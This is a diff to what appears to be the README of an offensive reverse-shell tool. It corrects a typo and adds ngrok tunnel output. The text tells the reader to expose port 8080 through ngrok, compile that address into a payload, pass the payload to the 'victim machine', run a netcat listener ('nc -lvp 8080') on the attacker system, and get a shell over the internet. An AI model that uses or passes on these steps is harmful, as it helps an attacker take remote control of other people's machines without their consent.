@@ -22,8 +22,16 @@ Cheers
 
 #Captain_Nemo
 
-PS: For WAN exploits , fore up ngrok with the following parameters (incase port forwarding is dissalowed by your ISP)
+PS: For WAN exploits , fire up ngrok with the following parameters (incase port forwarding is dissalowed by your ISP)
 ./ngrok tcp 8080
+
+Region                        United States (us)                                                                                        
+Web Interface                 http://127.0.0.1:4040                                                                                     
+Forwarding                    tcp://0.tcp.ngrok.io:19864 -> localhost:8080                                                              
+                                                                                                                                        
+Connections                   ttl     opn     rt1     rt5     p50     p90                                                               
+                              0       0       0.00    0.00    0.00    0.00   
+                              
 
 Ping 0.tcp.ngrok.io atleast 6-7 times to get a stable mirror IP and port.
 When u see that the IP and the port numbers are same after 5-6 last pings , use that IP and port in the code.> compile the code > pass it to the victim machine > make sure ngrok is NOT interrupted on the attacker machine as a new ngrok session will grab a new IP and port > start a nc -lvp 8080 on the attacker system. > execute the payload on the victim machine > get session over WAN/Internet on the attacker machine .
